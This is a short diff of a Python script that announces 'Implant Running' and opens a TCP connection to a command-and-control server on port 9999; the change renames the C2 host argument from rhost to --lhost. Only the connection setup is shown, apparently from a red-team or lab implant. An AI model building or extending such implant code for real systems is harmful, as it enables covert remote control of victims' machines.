@@ -10,13 +10,13 @@ import argparse
 
 # get the target ip address from command line input
 parser = argparse.ArgumentParser()
-parser.add_argument('rhost', required=False)
+parser.add_argument('--lhost', required=False)
 
 args = parser.parse_args()
 
-RHOST = args.rhost
-if RHOST is None:
-    RHOST = 'localhost'
+LHOST = args.lhost
+if LHOST is None:
+    LHOST = 'localhost'
 
 print("Implant Running")
 
@@ -122,7 +122,7 @@ while(True):
         # Create a TCP/IP socket
         c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # Connect the socket to the port where the server is listening
-        c2_server_address = (RHOST, 9999)
+        c2_server_address = (LHOST, 9999)
         print("Connecting to Socket")
         c2_socket.connect(c2_server_address)
 
